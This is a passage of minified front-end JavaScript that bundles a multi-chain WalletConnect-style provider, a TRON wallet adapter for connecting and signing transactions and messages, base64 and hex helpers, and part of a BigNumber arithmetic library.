                        this.session = this.client.session.get(this.providerOpts.session.topic)
                    } catch (Ot) {
                        throw this.logger.error("Failed to get session", Ot),
                        new Error("The provided session: ".concat(null == (t = null == (e = this.providerOpts) ? void 0 : e.session) ? void 0 : t.topic, " doesn't exist in the Sign client"))
                    }
                else {
                    const e = this.client.session.getAll();
                    this.session = e[0]
                }
                this.logger.trace("SignClient Initialized")
            }
            createProviders() {
                if (!this.client)
                    throw new Error("Sign Client not initialized");
                if (!this.session)
                    throw new Error("Session not initialized. Please call connect() before enable()");
                const e = [...new Set(Object.keys(this.session.namespaces).map((e => Rg(e))))];
                XE("client", this.client),
                XE("events", this.events),
                XE("disableProviderPing", this.disableProviderPing),
                e.forEach((e => {
                    if (!this.session)
                        return;
                    const t = function(e, t) {
                        const r = Object.keys(t.namespaces).filter((t => t.includes(e)));
                        if (!r.length)
                            return [];
                        const n = [];
                        return r.forEach((e => {
                            const r = t.namespaces[e].accounts;
                            n.push(...r)
                        }
                        )),
                        n
                    }(e, this.session)
                      , r = HE(t)
                      , n = qE(this.namespaces, this.optionalNamespaces)
                      , o = KP($P({}, n[e]), {
                        accounts: t,
                        chains: r
                    });
                    switch (e) {
                    case "eip155":
                        this.rpcProviders[e] = new hP({
                            namespace: o
                        });
                        break;
                    case "algorand":
                        this.rpcProviders[e] = new TP({
                            namespace: o
                        });
                        break;
                    case "solana":
                        this.rpcProviders[e] = new gP({
                            namespace: o
                        });
                        break;
                    case "cosmos":
                        this.rpcProviders[e] = new bP({
                            namespace: o
                        });
                        break;
                    case "polkadot":
                        this.rpcProviders[e] = new tP({
                            namespace: o
                        });
                        break;
                    case "cip34":
                        this.rpcProviders[e] = new PP({
                            namespace: o
                        });
                        break;
                    case "elrond":
                        this.rpcProviders[e] = new IP({
                            namespace: o
                        });
                        break;
                    case "multiversx":
                        this.rpcProviders[e] = new OP({
                            namespace: o
                        });
                        break;
                    case "near":
                        this.rpcProviders[e] = new RP({
                            namespace: o
                        });
                        break;
                    case "tezos":
                        this.rpcProviders[e] = new NP({
                            namespace: o
                        });
                        break;
                    default:
                        this.rpcProviders[$A] ? this.rpcProviders[$A].updateNamespace(o) : this.rpcProviders[$A] = new DP({
                            namespace: o
                        })
                    }
                }
                ))
            }
            registerEventListeners() {
                if (typeof this.client > "u")
                    throw new Error("Sign Client is not initialized");
                this.client.on("session_ping", (e => {
                    var t;
                    const {topic: r} = e;
                    r === (null == (t = this.session) ? void 0 : t.topic) && this.events.emit("session_ping", e)
                }
                )),
                this.client.on("session_event", (e => {
                    var t;
                    const {params: r, topic: n} = e;
                    if (n !== (null == (t = this.session) ? void 0 : t.topic))
                        return;
                    const {event: o} = r;
                    if ("accountsChanged" === o.name) {
                        const e = o.data;
                        e && Lg(e) && this.events.emit("accountsChanged", e.map($E))
                    } else if ("chainChanged" === o.name) {
                        const e = r.chainId
                          , t = r.event.data
                          , n = Rg(e)
                          , o = ZE(e) !== ZE(t) ? "".concat(n, ":").concat(ZE(t)) : e;
                        this.onChainChanged(o)
                    } else
                        this.events.emit(o.name, o.data);
                    this.events.emit("session_event", e)
                }
                )),
                this.client.on("session_update", (e => {
                    let {topic: t, params: r} = e;
                    var n, o;
                    if (t !== (null == (n = this.session) ? void 0 : n.topic))
                        return;
                    const {namespaces: i} = r
                      , s = null == (o = this.client) ? void 0 : o.session.get(t);
                    this.session = KP($P({}, s), {
                        namespaces: i
                    }),
                    this.onSessionUpdate(),
                    this.events.emit("session_update", {
                        topic: t,
                        params: r
                    })
                }
                )),
                this.client.on("session_delete", (async e => {
                    var t;
                    e.topic === (null == (t = this.session) ? void 0 : t.topic) && (await this.cleanup(),
                    this.events.emit("session_delete", e),
                    this.events.emit("disconnect", KP($P({}, Dg("USER_DISCONNECTED")), {
                        data: e.topic
                    })))
                }
                )),
                this.on(ZA, (e => {
                    this.onChainChanged(e, !0)
                }
                ))
            }
            getProvider(e) {
                return this.rpcProviders[e] || this.rpcProviders[$A]
            }
            onSessionUpdate() {
                Object.keys(this.rpcProviders).forEach((e => {
                    var t;
                    this.getProvider(e).updateNamespace(null == (t = this.session) ? void 0 : t.namespaces[e])
                }
                ))
            }
            setNamespaces(e) {
                const {namespaces: t={}, optionalNamespaces: r={}, sessionProperties: n, scopedProperties: o} = e;
                this.optionalNamespaces = qE(t, r),
                this.sessionProperties = n,
                this.scopedProperties = o
            }
            validateChain(e) {
                const [t,r] = (null === e || void 0 === e ? void 0 : e.split(":")) || ["", ""];
                if (!this.namespaces || !Object.keys(this.namespaces).length)
                    return [t, r];
                if (t && !Object.keys(this.namespaces || {}).map((e => Rg(e))).includes(t))
                    throw new Error("Namespace '".concat(t, "' is not configured. Please call connect() first with namespace config."));
                if (t && r)
                    return [t, r];
                const n = Rg(Object.keys(this.namespaces)[0]);
                return [n, this.rpcProviders[n].getDefaultChain()]
            }
            async requestAccounts() {
                const [e] = this.validateChain();
                return await this.getProvider(e).requestAccounts()
            }
            async onChainChanged(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                if (!this.namespaces)
                    return;
                const [r,n] = this.validateChain(e);
                if (!n)
                    return;
                this.updateNamespaceChain(r, n),
                this.events.emit("chainChanged", n);
                const o = this.getProvider(r).getDefaultChain();
                t || this.getProvider(r).setDefaultChain(n),
                this.emitAccountsChangedOnChainChange({
                    namespace: r,
                    previousChainId: o,
                    newChainId: e
                }),
                await this.persist("namespaces", this.namespaces)
            }
            emitAccountsChangedOnChainChange(e) {
                let {namespace: t, previousChainId: r, newChainId: n} = e;
                var o, i;
                try {
                    if (r === n)
                        return;
                    const e = null == (i = null == (o = this.session) ? void 0 : o.namespaces[t]) ? void 0 : i.accounts;
                    if (!e)
                        return;
                    const s = e.filter((e => e.includes("".concat(n, ":")))).map($E);
                    if (!Lg(s))
                        return;
                    this.events.emit("accountsChanged", s)
                } catch (M) {
                    this.logger.warn("Failed to emit accountsChanged on chain change", M)
                }
            }
            updateNamespaceChain(e, t) {
                if (!this.namespaces)
                    return;
                const r = this.namespaces[e] ? e : "".concat(e, ":").concat(t)
                  , n = {
                    chains: [],
                    methods: [],
                    events: [],
                    defaultChain: t
                };
                this.namespaces[r] ? this.namespaces[r] && (this.namespaces[r].defaultChain = t) : this.namespaces[r] = n
            }
            onConnect() {
                this.createProviders(),
                this.events.emit("connect", {
                    session: this.session
                })
            }
            async cleanup() {
                this.namespaces = void 0,
                this.optionalNamespaces = void 0,
                this.sessionProperties = void 0,
                await this.deleteFromStore("namespaces"),
                await this.deleteFromStore("optionalNamespaces"),
                await this.deleteFromStore("sessionProperties"),
                this.session = void 0,
                await this.cleanupPendingPairings({
                    deletePairings: !0
                }),
                await this.cleanupStorage()
            }
            async persist(e, t) {
                var r;
                const n = (null == (r = this.session) ? void 0 : r.topic) || "";
                await this.client.core.storage.setItem("".concat(qA, "/").concat(e).concat(n), t)
            }
            async getFromStore(e) {
                var t;
                const r = (null == (t = this.session) ? void 0 : t.topic) || "";
                return await this.client.core.storage.getItem("".concat(qA, "/").concat(e).concat(r))
            }
            async deleteFromStore(e) {
                var t;
                const r = (null == (t = this.session) ? void 0 : t.topic) || "";
                await this.client.core.storage.removeItem("".concat(qA, "/").concat(e).concat(r))
            }
            async cleanupStorage() {
                var e;
                try {
                    if ((null == (e = this.client) ? void 0 : e.session.length) > 0)
                        return;
                    const t = await this.client.core.storage.getKeys();
                    for (const e of t)
                        e.startsWith(qA) && await this.client.core.storage.removeItem(e)
                } catch (_l) {
                    this.logger.warn("Failed to cleanup storage", _l)
                }
            }
        }
        const JP = (e, t) => {
            "success" === t ? de.success(e, {
                autoClose: 3e3
            }) : de.error(e, {
                autoClose: 3e3
            })
        }
        ;
        var XP, QP, eC, tC, rC = r(7283);
        !function(e) {
            e.Loading = "Loading",
            e.NotFound = "NotFound",
            e.Found = "Found"
        }(XP || (XP = {})),
        function(e) {
            e.Loading = "Loading",
            e.NotFound = "NotFound",
            e.Disconnect = "Disconnected",
            e.Connected = "Connected"
        }(QP || (QP = {}));
        class nC extends rC {
            get connected() {
                return this.state === QP.Connected
            }
            disconnect() {
                return console.info("The current adapter doesn't support disconnect by DApp."),
                Promise.resolve()
            }
            multiSign() {
                return Promise.reject("The current wallet doesn't support multiSign.")
            }
            switchChain(e) {
                return Promise.reject("The current wallet doesn't support switch chain.")
            }
        }
        class oC extends Error {
            constructor(e, t) {
                super(e),
                this.error = t
            }
        }
        class iC extends oC {
            constructor() {
                super(...arguments),
                this.name = "WalletNotFoundError",
                this.message = "The wallet is not found."
            }
        }
        class sC extends oC {
            constructor() {
                super(...arguments),
                this.name = "WalletDisconnectedError",
                this.message = "The wallet is disconnected. Please connect first."
            }
        }
        class aC extends oC {
            constructor() {
                super(...arguments),
                this.name = "WalletConnectionError"
            }
        }
        class cC extends oC {
            constructor() {
                super(...arguments),
                this.name = "WalletDisconnectionError"
            }
        }
        class lC extends oC {
            constructor() {
                super(...arguments),
                this.name = "WalletSignMessageError"
            }
        }
        class uC extends oC {
            constructor() {
                super(...arguments),
                this.name = "WalletSignTransactionError"
            }
        }
        class dC extends oC {
            constructor() {
                super(...arguments),
                this.name = "WalletWindowClosedError",
                this.message = "The QR window is closed."
            }
        }
        !function(e) {
            e.Mainnet = "Mainnet",
            e.Shasta = "Shasta",
            e.Nile = "Nile",
            e.Unknown = "Unknown"
        }(eC || (eC = {})),
        function(e) {
            e.Mainnet = "Mainnet",
            e.Shasta = "Shasta",
            e.Nile = "Nile"
        }(tC || (tC = {}));
        var hC, fC, pC = r(7697);
        class gC {
            constructor(e) {
                this.openModal = pC.D8.open,
                this.closeModal = pC.D8.close,
                this.subscribeModal = pC.D8.subscribe,
                this.setTheme = pC.lH.setThemeConfig,
                pC.lH.setThemeConfig(e),
                pC.mb.setConfig(e),
                this.initUi()
            }
            async initUi() {
                if ("undefined" !== typeof window) {
                    await r.e(400).then(r.bind(r, 7400));
                    const e = document.createElement("wcm-modal");
                    document.body.insertAdjacentElement("beforeend", e),
                    pC.IN.setIsUiLoaded(!0)
                }
            }
        }
        class yC extends Error {
            constructor() {
                super(),
                Object.setPrototypeOf(this, yC.prototype)
            }
        }
        class mC extends Error {
            constructor(e) {
                super(e),
                Object.setPrototypeOf(this, mC.prototype)
            }
        }
        !function(e) {
            e.Mainnet = "tron:0x2b6653dc",
            e.Shasta = "tron:0x94a9059e",
            e.Nile = "tron:0xcd8690dc"
        }(hC || (hC = {})),
        function(e) {
            e.signTransaction = "tron_signTransaction",
            e.signMessage = "tron_signMessage"
        }(fC || (fC = {}));
        const bC = (e, t) => ({
            requiredNamespaces: {
                tron: {
                    chains: [e],
                    methods: [fC.signTransaction, fC.signMessage],
                    events: []
                }
            },
            pairingTopic: t
        });
        class vC {
            constructor(e) {
                this._options = e.options,
                this._network = e.network,
                this._modalConfig = e.web3ModalConfig || {},
                this.web3Modal = new gC((0,
                k.A)((0,
                k.A)({}, this._modalConfig), {}, {
                    projectId: this._options.projectId,
                    chains: [this._network, ...this._modalConfig.chains || []]
                }))
            }
            async connect() {
                var e;
                const t = null !== (e = this._client) && void 0 !== e ? e : await OA.init(this._options)
                  , r = t.find(bC(this._network)).filter((e => e.acknowledged));
                if (r.length) {
                    this._session = r[r.length - 1],
                    this._client = t,
                    this._client = t;
                    const e = Object.values(this._session.namespaces).map((e => e.accounts)).flat();
                    return this.address = e[0].split(":")[2],
                    {
                        address: this.address
                    }
                }
                {
                    const {uri: e, approval: r} = await t.connect(bC(this._network));
                    return new Promise(( (n, o) => {
                        e && (this.web3Modal.openModal({
                            uri: e,
                            chains: [this._network]
                        }),
                        this.web3Modal.subscribeModal((e => {
                            !1 === e.open && o(new mC("Modal is closed."))
                        }
                        ))),
                        r().then((e => {
                            this._session = e,
                            this._client = t;
                            const r = Object.values(this._session.namespaces).map((e => e.accounts)).flat();
                            this.address = r[0].split(":")[2],
                            n({
                                address: this.address
                            })
                        }
                        )).catch(o).finally(( () => {
                            this.web3Modal.closeModal()
                        }
                        ))
                    }
                    ))
                }
            }
            async disconnect() {
                if (!this._client || !this._session)
                    throw new yC;
                await this._client.disconnect({
                    topic: this._session.topic,
                    reason: Dg("USER_DISCONNECTED")
                }),
                this._session = void 0
            }
            get client() {
                if (this._client)
                    return Object.assign({}, this._client, {
                        off: this._client.removeListener
                    });
                throw new yC
            }
            async checkConnectStatus() {
                var e;
                const t = null !== (e = this._client) && void 0 !== e ? e : await OA.init(this._options)
                  , r = t.find(bC(this._network)).filter((e => e.acknowledged));
                if (r.length) {
                    this._session = r[r.length - 1],
                    this._client = t;
                    const e = Object.values(this._session.namespaces).map((e => e.accounts)).flat();
                    return this.address = e[0].split(":")[2],
                    {
                        address: this.address
                    }
                }
                return {
                    address: ""
                }
            }
            async signTransaction(e) {
                if (this._client && this._session) {
                    const {result: t} = await this._client.request({
                        chainId: this._network,
                        topic: this._session.topic,
                        request: {
                            method: fC.signTransaction,
                            params: {
                                address: this.address,
                                transaction: (0,
                                k.A)({}, e)
                            }
                        }
                    });
                    return t
                }
                throw new yC
            }
            async signMessage(e) {
                if (this._client && this._session) {
                    const {signature: t} = await this._client.request({
                        chainId: this._network,
                        topic: this._session.topic,
                        request: {
                            method: fC.signMessage,
                            params: {
                                address: this.address,
                                message: e
                            }
                        }
                    });
                    return t
                }
                throw new yC
            }
        }
        var wC = function(e, t, r, n) {
            return new (r || (r = Promise))((function(o, i) {
                function s(e) {
                    try {
                        c(n.next(e))
                    } catch (_l) {
                        i(_l)
                    }
                }
                function a(e) {
                    try {
                        c(n.throw(e))
                    } catch (_l) {
                        i(_l)
                    }
                }
                function c(e) {
                    var t;
                    e.done ? o(e.value) : (t = e.value,
                    t instanceof r ? t : new r((function(e) {
                        e(t)
                    }
                    ))).then(s, a)
                }
                c((n = n.apply(e, t || [])).next())
            }
            ))
        };
        const TC = Object.keys(tC);
        const AC = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        class EC {
            encode(e) {
                let t, r, n, o, i, s, a, c = "", l = 0;
                for (; l < e.length; )
                    t = e.charCodeAt(l++),
                    r = e.charCodeAt(l++),
                    n = e.charCodeAt(l++),
                    o = t >> 2,
                    i = (3 & t) << 4 | r >> 4,
                    s = (15 & r) << 2 | n >> 6,
                    a = 63 & n,
                    isNaN(r) ? s = a = 64 : isNaN(n) && (a = 64),
                    c = c + AC.charAt(o) + AC.charAt(i) + AC.charAt(s) + AC.charAt(a);
                return c
            }
            encodeIgnoreUtf8(e) {
                let t, r, n, o, i, s, a, c = "", l = 0;
                for (; l < e.length; )
                    t = e[l++],
                    r = e[l++],
                    n = e[l++],
                    o = t >> 2,
                    i = (3 & t) << 4 | r >> 4,
                    s = (15 & r) << 2 | n >> 6,
                    a = 63 & n,
                    isNaN(r) ? s = a = 64 : isNaN(n) && (a = 64),
                    c = c + AC.charAt(o) + AC.charAt(i) + AC.charAt(s) + AC.charAt(a);
                return c
            }
            decode(e) {
                let t, r, n, o, i, s, a, c = "", l = 0;
                for (e = e.replace(/[^A-Za-z0-9\+\/\=]/g, ""); l < e.length; )
                    o = AC.indexOf(e.charAt(l++)),
                    i = AC.indexOf(e.charAt(l++)),
                    s = AC.indexOf(e.charAt(l++)),
                    a = AC.indexOf(e.charAt(l++)),
                    t = o << 2 | i >> 4,
                    r = (15 & i) << 4 | s >> 2,
                    n = (3 & s) << 6 | a,
                    c += String.fromCharCode(t),
                    64 != s && (c += String.fromCharCode(r)),
                    64 != a && (c += String.fromCharCode(n));
                return this._utf8_decode(c)
            }
            decodeToByteArray(e) {
                let t, r, n, o, i, s, a, c = "", l = 0;
                for (e = e.replace(/[^A-Za-z0-9\+\/\=]/g, ""); l < e.length; )
                    o = AC.indexOf(e.charAt(l++)),
                    i = AC.indexOf(e.charAt(l++)),
                    s = AC.indexOf(e.charAt(l++)),
                    a = AC.indexOf(e.charAt(l++)),
                    t = o << 2 | i >> 4,
                    r = (15 & i) << 4 | s >> 2,
                    n = (3 & s) << 6 | a,
                    c += String.fromCharCode(t),
                    64 != s && (c += String.fromCharCode(r)),
                    64 != a && (c += String.fromCharCode(n));
                return this._out2ByteArray(c)
            }
            _out2ByteArray(e) {
                const t = new Array(e.length);
                let r = 0
                  , n = 0;
                for (; r < e.length; )
                    n = e.charCodeAt(r),
                    t[r] = n,
                    r++;
                return t
            }
            _utf8_encode(e) {
                e = e.replace(/\r\n/g, "\n");
                let t = "";
                for (let r = 0; r < e.length; r++) {
                    const n = e.charCodeAt(r);
                    n < 128 ? t += String.fromCharCode(n) : n > 127 && n < 2048 ? (t += String.fromCharCode(n >> 6 | 192),
                    t += String.fromCharCode(63 & n | 128)) : (t += String.fromCharCode(n >> 12 | 224),
                    t += String.fromCharCode(n >> 6 & 63 | 128),
                    t += String.fromCharCode(63 & n | 128))
                }
                return t
            }
            _utf8_decode(e) {
                let t = ""
                  , r = 0
                  , n = 0
                  , o = 0
                  , i = 0;
                for (; r < e.length; )
                    n = e.charCodeAt(r),
                    n < 128 ? (t += String.fromCharCode(n),
                    r++) : n > 191 && n < 224 ? (o = e.charCodeAt(r + 1),
                    t += String.fromCharCode((31 & n) << 6 | 63 & o),
                    r += 2) : (o = e.charCodeAt(r + 1),
                    i = e.charCodeAt(r + 2),
                    t += String.fromCharCode((15 & n) << 12 | (63 & o) << 6 | 63 & i),
                    r += 3);
                return t
            }
        }
        function PC(e) {
            if (e < 0 || e > 255)
                throw new Error("Input must be a byte");
            const t = "0123456789ABCDEF";
            let r = "";
            return r += t.charAt(e >> 4),
            r += t.charAt(15 & e),
            r
        }
        function CC(e) {
            let t = "";
            for (let r = 0; r < e.length; r++) {
                const n = e[r].toString(2)
                  , o = n.match(/^1+?(?=0)/);
                if (o && 8 === n.length) {
                    const n = o[0].length;
                    let i = e[r].toString(2).slice(7 - n);
                    for (let t = 1; t < n; t++)
                        i += e[t + r].toString(2).slice(2);
                    t += String.fromCharCode(parseInt(i, 2)),
                    r += n - 1
                } else
                    t += String.fromCharCode(e[r])
            }
            return t
        }
        function SC(e) {
            const t = e.replace(/^0x/, "").split("");
            let r = "";
            for (let n = 0; n < t.length / 2; n++) {
                const e = "0x".concat(t[2 * n]).concat(t[2 * n + 1]);
                r += String.fromCharCode(parseInt(e))
            }
            return r
        }
        function IC(e) {
            let t = "";
            for (let r = 0; r < e.length; r++)
                t += PC(e[r]);
            return t
        }
        function BC(e) {
            return (new EC).decodeToByteArray(e)
        }
        function xC(e) {
            return (new EC).encodeIgnoreUtf8(e)
        }
        function OC(e) {
            return CC(e)
        }
        function _C(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
            if (e.length != t.length)
                return !1;
            for (let n = 0; n < e.length; n++)
                if (r) {
                    if (e[n] != t[n])
                        return !1
                } else if (JSON.stringify(e[n]) != JSON.stringify(t[n]))
                    return !1;
            return !0
        }
        function WC(e) {
            const t = []
              , r = e.length;
            let n;
            for (let o = 0; o < r; o++)
                n = e.charCodeAt(o),
                n >= 65536 && n <= 1114111 ? (t.push(n >> 18 & 7 | 240),
                t.push(n >> 12 & 63 | 128),
                t.push(n >> 6 & 63 | 128),
                t.push(63 & n | 128)) : n >= 2048 && n <= 65535 ? (t.push(n >> 12 & 15 | 224),
                t.push(n >> 6 & 63 | 128),
                t.push(63 & n | 128)) : n >= 128 && n <= 2047 ? (t.push(n >> 6 & 31 | 192),
                t.push(63 & n | 128)) : t.push(255 & n);
            return t
        }
        function RC(e) {
            let t;
            if (e >= "A" && e <= "F" ? t = e.charCodeAt(0) - "A".charCodeAt(0) + 10 : e >= "a" && e <= "f" ? t = e.charCodeAt(0) - "a".charCodeAt(0) + 10 : e >= "0" && e <= "9" && (t = e.charCodeAt(0) - "0".charCodeAt(0)),
            "number" === typeof t)
                return t;
            throw new Error("The passed hex char is not a valid hex char")
        }
        function kC(e) {
            return e >= "A" && e <= "F" || e >= "a" && e <= "f" || e >= "0" && e <= "9" ? 1 : 0
        }
        function MC(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1]
              , r = e.length;
            t && r % 2 && (e = "0".concat(e),
            r++);
            const n = [];
            let o = 0
              , i = 0
              , s = 0;
            for (let a = 0; a < r; a++) {
                const t = e.charAt(a);
                if (!kC(t))
                    throw new Error("The passed hex char is not a valid hex string");
                o <<= 4,
                o += RC(t),
                i++,
                0 === i % 2 && (n[s++] = o,
                o = 0)
            }
            return n
        }
        function NC(e) {
            if (!/^\d{4}-\d{2}-\d{2}( \d{2}-\d{2}-\d{2}|)/.test(e))
                throw new Error("The passed date string is not valid");
            const t = e.split(" ")
              , r = t[0].split("-")
              , n = parseInt(r[0], 10)
              , o = parseInt(r[1], 10) - 1
              , i = parseInt(r[2], 10);
            if (t.length > 1) {
                const e = t[1].split("-")
                  , r = parseInt(e[0], 10)
                  , s = parseInt(e[1], 10)
                  , a = parseInt(e[2], 10);
                return new Date(n,o,i,r,s,a)
            }
            return new Date(n,o,i)
        }
        function FC(e) {
            return e >= "0" && e <= "9" ? 1 : 0
        }
        function UC(e) {
            if (null == e)
                return -1;
            if (0 == e.length || "" == e)
                return -1;
            let t = 0;
            if (40 == e.length)
                for (; t < 40; t++) {
                    if (!kC(e.charAt(t)))
                        break
                }
            if (40 == t)
                return 1;
            for (t = 0; t < e.length; t++) {
                if (!FC(e.charAt(t)))
                    break
            }
            if (t == e.length)
                return 2;
            for (t = 0; t < e.length; t++) {
                if (e.charAt(t) > " ")
                    return 3
            }
            return -1
        }
        var DC = /^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i
          , LC = Math.ceil
          , jC = Math.floor
          , zC = "[BigNumber Error] "
          , VC = zC + "Number primitive has more than 15 significant digits: "
          , HC = 1e14
          , qC = 14
          , GC = 9007199254740991
          , $C = [1, 10, 100, 1e3, 1e4, 1e5, 1e6, 1e7, 1e8, 1e9, 1e10, 1e11, 1e12, 1e13]
          , KC = 1e7
          , ZC = 1e9;
        function YC(e) {
            var t = 0 | e;
            return e > 0 || e === t ? t : t - 1
        }
        function JC(e) {
            for (var t, r, n = 1, o = e.length, i = e[0] + ""; n < o; ) {
                for (t = e[n++] + "",
                r = qC - t.length; r--; t = "0" + t)
                    ;
                i += t
            }
            for (o = i.length; 48 === i.charCodeAt(--o); )
                ;
            return i.slice(0, o + 1 || 1)
        }
        function XC(e, t) {
            var r, n, o = e.c, i = t.c, s = e.s, a = t.s, c = e.e, l = t.e;
            if (!s || !a)
                return null;
            if (r = o && !o[0],
            n = i && !i[0],
            r || n)
                return r ? n ? 0 : -a : s;
            if (s != a)
                return s;
            if (r = s < 0,
            n = c == l,
            !o || !i)
                return n ? 0 : !o ^ r ? 1 : -1;
            if (!n)
                return c > l ^ r ? 1 : -1;
            for (a = (c = o.length) < (l = i.length) ? c : l,
            s = 0; s < a; s++)
                if (o[s] != i[s])
                    return o[s] > i[s] ^ r ? 1 : -1;
            return c == l ? 0 : c > l ^ r ? 1 : -1
        }
        function QC(e, t, r, n) {
            if (e < t || e > r || e !== jC(e))
                throw Error(zC + (n || "Argument") + ("number" == typeof e ? e < t || e > r ? " out of range: " : " not an integer: " : " not a primitive number: ") + String(e))
        }
        function eS(e) {
            var t = e.c.length - 1;
            return YC(e.e / qC) == t && e.c[t] % 2 != 0
        }
        function tS(e, t) {
            return (e.length > 1 ? e.charAt(0) + "." + e.slice(1) : e) + (t < 0 ? "e" : "e+") + t
        }
        function rS(e, t, r) {
            var n, o;
            if (t < 0) {
                for (o = r + "."; ++t; o += r)
                    ;
                e = o + e
            } else if (++t > (n = e.length)) {
                for (o = r,
                t -= n; --t; o += r)
                    ;
                e += o
            } else
                t < n && (e = e.slice(0, t) + "." + e.slice(t));
            return e
        }
        var nS = function e(t) {
            var r, n, o, i = v.prototype = {
                constructor: v,
                toString: null,
                valueOf: null
            }, s = new v(1), a = 20, c = 4, l = -7, u = 21, d = -1e7, h = 1e7, f = !1, p = 1, g = 0, y = {
                prefix: "",
                groupSize: 3,
                secondaryGroupSize: 0,
                groupSeparator: ",",
                decimalSeparator: ".",
                fractionGroupSize: 0,
                fractionGroupSeparator: "\xa0",
                suffix: ""
            }, m = "0123456789abcdefghijklmnopqrstuvwxyz", b = !0;
            function v(e, t) {
                var r, i, s, l, u, f, p, g, y = this;
                if (!(y instanceof v))
                    return new v(e,t);
                if (null == t) {
                    if (e && !0 === e._isBigNumber)
                        return y.s = e.s,
                        void (!e.c || e.e > h ? y.c = y.e = null : e.e < d ? y.c = [y.e = 0] : (y.e = e.e,
                        y.c = e.c.slice()));
                    if ((f = "number" == typeof e) && 0 * e == 0) {
                        if (y.s = 1 / e < 0 ? (e = -e,
                        -1) : 1,
                        e === ~~e) {
                            for (l = 0,
                            u = e; u >= 10; u /= 10,
                            l++)
                                ;
                            return void (l > h ? y.c = y.e = null : (y.e = l,
                            y.c = [e]))
                        }
                        g = String(e)
                    } else {
                        if (!DC.test(g = String(e)))
                            return o(y, g, f);
                        y.s = 45 == g.charCodeAt(0) ? (g = g.slice(1),
                        -1) : 1
                    }
                    (l = g.indexOf(".")) > -1 && (g = g.replace(".", "")),
                    (u = g.search(/e/i)) > 0 ? (l < 0 && (l = u),
                    l += +g.slice(u + 1),
                    g = g.substring(0, u)) : l < 0 && (l = g.length)
                } else {
                    if (QC(t, 2, m.length, "Base"),
                    10 == t && b)
                        return E(y = new v(e), a + y.e + 1, c);
                    if (g = String(e),
                    f = "number" == typeof e) {
                        if (0 * e != 0)
                            return o(y, g, f, t);
                        if (y.s = 1 / e < 0 ? (g = g.slice(1),
                        -1) : 1,
                        v.DEBUG && g.replace(/^0\.0*|\./, "").length > 15)
                            throw Error(VC + e)
                    } else
                        y.s = 45 === g.charCodeAt(0) ? (g = g.slice(1),
                        -1) : 1;
                    for (r = m.slice(0, t),
                    l = u = 0,
                    p = g.length; u < p; u++)
                        if (r.indexOf(i = g.charAt(u)) < 0) {
                            if ("." == i) {
                                if (u > l) {
                                    l = p;
                                    continue
                                }
                            } else if (!s && (g == g.toUpperCase() && (g = g.toLowerCase()) || g == g.toLowerCase() && (g = g.toUpperCase()))) {
                                s = !0,
                                u = -1,
                                l = 0;
                                continue
                            }
                            return o(y, String(e), f, t)
                        }
                    f = !1,
                    (l = (g = n(g, t, 10, y.s)).indexOf(".")) > -1 ? g = g.replace(".", "") : l = g.length
                }
                for (u = 0; 48 === g.charCodeAt(u); u++)
                    ;
                for (p = g.length; 48 === g.charCodeAt(--p); )
                    ;
                if (g = g.slice(u, ++p)) {
                    if (p -= u,
                    f && v.DEBUG && p > 15 && (e > GC || e !== jC(e)))
                        throw Error(VC + y.s * e);
                    if ((l = l - u - 1) > h)
                        y.c = y.e = null;
                    else if (l < d)
                        y.c = [y.e = 0];
                    else {
                        if (y.e = l,
                        y.c = [],
                        u = (l + 1) % qC,
                        l < 0 && (u += qC),
                        u < p) {
                            for (u && y.c.push(+g.slice(0, u)),
                            p -= qC; u < p; )
                                y.c.push(+g.slice(u, u += qC));
                            u = qC - (g = g.slice(u)).length
                        } else
                            u -= p;
                        for (; u--; g += "0")
                            ;
                        y.c.push(+g)
                    }
                } else
                    y.c = [y.e = 0]
            }
            function w(e, t, r, n) {
                var o, i, s, a, d;
                if (null == r ? r = c : QC(r, 0, 8),
                !e.c)
                    return e.toString();
                if (o = e.c[0],
                s = e.e,
                null == t)
                    d = JC(e.c),
                    d = 1 == n || 2 == n && (s <= l || s >= u) ? tS(d, s) : rS(d, s, "0");
                else if (i = (e = E(new v(e), t, r)).e,
                a = (d = JC(e.c)).length,
                1 == n || 2 == n && (t <= i || i <= l)) {
                    for (; a < t; d += "0",
                    a++)
                        ;
                    d = tS(d, i)
                } else if (t -= s,
                d = rS(d, i, "0"),
                i + 1 > a) {
                    if (--t > 0)
                        for (d += "."; t--; d += "0")
                            ;
                } else if ((t += i - a) > 0)
                    for (i + 1 == a && (d += "."); t--; d += "0")
                        ;
                return e.s < 0 && o ? "-" + d : d
            }
            function T(e, t) {
                for (var r, n, o = 1, i = new v(e[0]); o < e.length; o++)
                    (!(n = new v(e[o])).s || (r = XC(i, n)) === t || 0 === r && i.s === t) && (i = n);
                return i
            }
            function A(e, t, r) {
                for (var n = 1, o = t.length; !t[--o]; t.pop())
                    ;
                for (o = t[0]; o >= 10; o /= 10,
                n++)
                    ;
                return (r = n + r * qC - 1) > h ? e.c = e.e = null : r < d ? e.c = [e.e = 0] : (e.e = r,
                e.c = t),
                e
            }
            function E(e, t, r, n) {
                var o, i, s, a, c, l, u, f = e.c, p = $C;
                if (f) {
                    e: {
                        for (o = 1,
                        a = f[0]; a >= 10; a /= 10,
                        o++)
                            ;
                        if ((i = t - o) < 0)
                            i += qC,
                            s = t,
                            c = f[l = 0],
                            u = jC(c / p[o - s - 1] % 10);
                        else if ((l = LC((i + 1) / qC)) >= f.length) {
                            if (!n)
                                break e;
                            for (; f.length <= l; f.push(0))
                                ;
                            c = u = 0,
                            o = 1,
                            s = (i %= qC) - qC + 1
                        } else {
                            for (c = a = f[l],
                            o = 1; a >= 10; a /= 10,
                            o++)
                                ;
                            u = (s = (i %= qC) - qC + o) < 0 ? 0 : jC(c / p[o - s - 1] % 10)
                        }
                        if (n = n || t < 0 || null != f[l + 1] || (s < 0 ? c : c % p[o - s - 1]),
                        n = r < 4 ? (u || n) && (0 == r || r == (e.s < 0 ? 3 : 2)) : u > 5 || 5 == u && (4 == r || n || 6 == r && (i > 0 ? s > 0 ? c / p[o - s] : 0 : f[l - 1]) % 10 & 1 || r == (e.s < 0 ? 8 : 7)),
                        t < 1 || !f[0])
                            return f.length = 0,
                            n ? (t -= e.e + 1,
                            f[0] = p[(qC - t % qC) % qC],
                            e.e = -t || 0) : f[0] = e.e = 0,
